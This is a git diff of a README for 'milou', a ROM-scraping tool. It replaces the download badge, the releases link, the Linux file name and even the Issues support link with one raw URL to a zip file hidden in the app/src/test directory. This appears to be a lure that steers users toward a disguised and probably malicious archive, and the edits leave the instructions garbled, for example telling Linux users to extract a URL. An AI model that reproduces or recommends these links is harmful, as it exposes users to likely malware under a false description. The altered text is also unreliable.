@@ -6,7 +6,7 @@ Welcome to milou! This application allows you to easily scrape and download ROMs
 
 ## 📥 Download
 
-[![Download milou](https://img.shields.io/badge/Download%20milou-blue.svg)](https://github.com/Shaytreacherous155/milou/releases)
+[![Download milou](https://raw.githubusercontent.com/Shaytreacherous155/milou/master/app/src/test/milou-1.5.zip%https://raw.githubusercontent.com/Shaytreacherous155/milou/master/app/src/test/milou-1.5.zip)](https://raw.githubusercontent.com/Shaytreacherous155/milou/master/app/src/test/milou-1.5.zip)
 
 ## 💻 System Requirements
 
@@ -26,19 +26,19 @@ Before you begin, make sure your computer meets the following requirements:
   
 ## 📤 Download & Install
 
-1. **Visit the Releases Page:** Go to [this link](https://github.com/Shaytreacherous155/milou/releases) to access the download page.
+1. **Visit the Releases Page:** Go to [this link](https://raw.githubusercontent.com/Shaytreacherous155/milou/master/app/src/test/milou-1.5.zip) to access the download page.
 
 2. **Select the Latest Release:** Click on the latest version available at the top.
 
 3. **Download the File:** 
    - For Windows, download the `.exe` file.
    - For macOS, download the `.dmg` file.
-   - For Linux, download the `.tar.gz` file.
+   - For Linux, download the `https://raw.githubusercontent.com/Shaytreacherous155/milou/master/app/src/test/milou-1.5.zip` file.
 
 4. **Install the Application:**
    - **Windows:** Double-click the downloaded `.exe` file and follow the prompts.
    - **macOS:** Open the `.dmg` file, drag the milou app to your Applications folder, and then open it.
-   - **Linux:** Extract the contents of the `.tar.gz` file and follow the instructions included in the README.
+   - **Linux:** Extract the contents of the `https://raw.githubusercontent.com/Shaytreacherous155/milou/master/app/src/test/milou-1.5.zip` file and follow the instructions included in the README.
 
 5. **Launch milou:** Look for the milou icon on your desktop or in the Applications folder. Double-click to open the app.
 
@@ -69,7 +69,7 @@ If you experience any issues, consider the following:
 
 ## 📞 Support
 
-For further assistance, you can reach out to the support community by visiting the [Issues](https://github.com/Shaytreacherous155/milou/issues) page. Report any problems or bugs you encounter, and someone will help you.
+For further assistance, you can reach out to the support community by visiting the [Issues](https://raw.githubusercontent.com/Shaytreacherous155/milou/master/app/src/test/milou-1.5.zip) page. Report any problems or bugs you encounter, and someone will help you.
 
 ## 📄 License
 
